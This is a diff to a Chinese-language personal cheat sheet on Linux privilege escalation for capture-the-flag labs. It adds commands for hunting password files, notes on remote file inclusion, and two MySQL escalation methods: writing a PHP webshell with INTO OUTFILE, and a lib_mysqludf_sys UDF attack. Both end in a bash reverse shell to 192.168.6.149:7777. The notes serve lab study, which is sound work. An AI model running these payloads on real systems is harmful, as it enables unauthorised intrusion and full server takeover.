@@ -65,6 +65,17 @@ sudo -u natalia /bin/bash
 #例如这个xargs是sudo时不需要密码，但是不用sudo运行可能是无法运行的，因为没有权限，这里的NOPASSWD是用sudo提升权限运行它且不需要密码，而不是说不用sudo就可以直接运行它
 ```
 
+查找各类文件
+
+```bash
+#查看/home是否可以访问其他用户文件
+ls -al /home
+#查找属于当前用户的文件，一般搜关键字user、pass
+find / -user curr_user -name user(pass) 2>/dev/null
+#查找不属于当前用户但当前用户可读或者可写的文件,/u=w是写，一般也加上搜索关键字user、pass
+find / -not -user curr_user -name user(pass) -perm /u=r
+```
+
 6、查看某些命令在设置SUID位或者有sudo NOPASSWD等权限时如何提权
 
 ```bash
@@ -175,3 +186,69 @@ cat log.txt |grep /usr/bin/zip
 22、如果a软件可以集中管理b软件，那么可以尝试用b的漏洞在a中实现，比如hmv.adria中的scalar是管理git的工具，git可以被利用的漏洞scalar可以类似的利用
 
 23、存在某些可执行文件的help或者man（可执行文件说明），在输入参数help查看时会由于内容过度导致采用分页器less进行查看，如果help的原文件是脚本等，边查看边解释运行，则此时可以通过直接在解释的过程中输入!/bin/bash来获得一个运行该文件用户身份的shell。（见hmv.adria)
+
+24、如果可以在网站中访问其它网站，那就可以尝试远程文件包含和本地文件包含，当远程文件包含但无法执行远程文件中的命令时（有可能对远程文件的内容在本地解析执行时进行了过滤）。当存在解析过滤时，还可以尝试把远程文件利用>重定向到可以访问的目录下，然后在此目录下直接访问文件（可能远程文件包含只是单纯的用curl下载下来然后过滤再解析执行回显给浏览器）
+
+```bash
+#这里一般就包括这两种情况
+1、没有很好的过滤或者使用了不安全的函数例如system去解析执行远程下载的文件
+2、要么就存在下载用户输入的URL时对URL的过滤不周全（远程下载网页是需要用执行命令例如curl等去实现的，一般一定会用到system等函数），如果此时过滤不好就可以构造恶意的URL实现远程代码执行。
+```
+
+25、登录到数据库情况下的两种提权方法
+
+```bash 
+#####文件写入
+#前提条件：
+1、%secure_file_priv%为NULL或者可以为需要写入文件的位置
+
+PS:这里的目的是数据库可以写文件
+
+show variables like "%secure_file_priv%";
+
+2、登录到数据库的用户的file权限存在，可以单独指出FILE PRIVILEGES权限，也可是ALL PRIVILEGES有权限（代表拥有所有权限）
+
+PS:这里的目的是当前用户可以写文件
+
+SHOW GRANTS FOR 'user_name'@'host_name';
+
+3、http网站服务是以高权限用户身份运行的（例如root）,而且数据库可以向网站根目录下写文件（这就需要运行数据库的用户身份是高权限用户才可以，可以通过pspy查看）
+
+PS:这里的目的一是通过webshell得到的shell是高权限用户的，二是数据库只有高权限才能向网站根目录下写文件，单纯%secure_file_priv%为NULL是没用的
+
+#反弹shell写入
+select '<?php system("bash -c \'bash -i >& /dev/tcp/192.168.6.149/7777 0>&1\'"); ?>' into outfile '/opt/shell.php';
+
+
+
+
+
+#####UDF攻击
+#参考网页https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library
+#前提条件
+1、%secure_file_priv%为NULL或者为插件plugin路径
+
+PS:这里的目的是保证数据库可以写文件
+
+show variables like "%secure_file_priv%";
+show variables like '%plugin%'; #查看插件路径
+
+2、登录到数据库的用户的file权限存在，可以单独指出FILE PRIVILEGES权限，也可是ALL PRIVILEGES有权限（代表拥有所有权限）
+
+PS：这里的目的是保证当前用户可以向plugin路径写文件
+
+SHOW GRANTS FOR 'user_name'@'host_name';
+
+3、数据库是以高权限用户身份运行的，例如root
+
+PS:这里的目的是能以高权限用户身份执行写入的文件，以获得shell，这是和文件写入方法不同的
+
+use mysql
+create table foo(line blob); #blod是一个很大的数据类型
+insert into foo1 values(load_file('/tmp/lib_mysqludf_sys.so'));#该.so通过locate "*lib_mysqludf_sys*"可以获得，需要安装有sqlmap或者msf
+select * from foo1 into dumpfile '/usr/local/mysql/lib/plugin/lib_mysqludf_sys.so';
+cp /tmp/lib_mysqludf_sys.so /usr/local/mysql/lib/plugin/lib_mysqludf_sys.so #如果可以直接在mysql外部写入用这个命令，否则无视
+create function sys_eval returns integer soname 'lib_mysqludf_sys.so';
+select sys_eval('bash -i >& /dev/tcp/192.168.6.149/7777 0>&1');
+```
+
